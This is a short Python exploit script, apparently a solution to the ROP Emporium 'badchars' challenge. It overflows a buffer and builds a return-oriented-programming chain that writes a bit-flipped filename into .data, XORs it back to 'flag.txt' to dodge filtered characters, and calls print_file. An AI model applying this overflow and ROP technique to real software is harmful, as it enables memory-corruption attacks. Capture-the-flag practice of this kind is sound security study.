#!/usr/bin/env python

# padding: 40 bytes

import struct
import sys

padding_len = 32 #until just before rbp is overwritten

leetcoff = struct.pack("L", 0x13371337c000ffee)

print_file = struct.pack("L", 0x400510)

mov_pr13_r12 = struct.pack("L", 0x400634)
xor_pr15_r14 = struct.pack("L", 0x400628)

pop_r12_to_r15 = struct.pack("L", 0x40069c)
pop_r14_r15 = struct.pack("L", 0x4006a0)
pop_rdi = struct.pack("L", 0x4006a3)


filename_loc_raw = 0x601029 #vorher 8
filename_loc = struct.pack("L", filename_loc_raw) #.data
filename_raw = b"fl`f/tyt" # lsb flip: a <-> ` | g <-> f | . <-> / | x <-> y 
#                  ^^^ ^

flip1 = struct.pack("L", filename_loc_raw+2)
flip2 = struct.pack("L", filename_loc_raw+3)
flip3 = struct.pack("L", filename_loc_raw+4)
flip4 = struct.pack("L", filename_loc_raw+6)

lsbmask = struct.pack("L", 0x01)

payload = b'A'*padding_len
payload += leetcoff 

payload += pop_r12_to_r15
payload += filename_raw #r12
payload += filename_loc #r13
payload += leetcoff     #r14
payload += leetcoff     #r15
payload += mov_pr13_r12

payload += pop_r14_r15 
payload += lsbmask  #r14
payload += flip1    #r15
payload += xor_pr15_r14 

payload += pop_r14_r15 
payload += lsbmask  #r14
payload += flip2    #r15
payload += xor_pr15_r14 

payload += pop_r14_r15 
payload += lsbmask  #r14
payload += flip3    #r15 
payload += xor_pr15_r14 

payload += pop_r14_r15 
payload += lsbmask  #r14
payload += flip4    #r15
payload += xor_pr15_r14 

payload += pop_rdi
payload += filename_loc
payload += print_file

for c in [b'x', b'g', b'a', b'.']:
    if c in payload:
        sys.stderr.buffer.write(b"[WARN] bad char in payload: " + c + b"\n")

sys.stdout.buffer.write(payload)
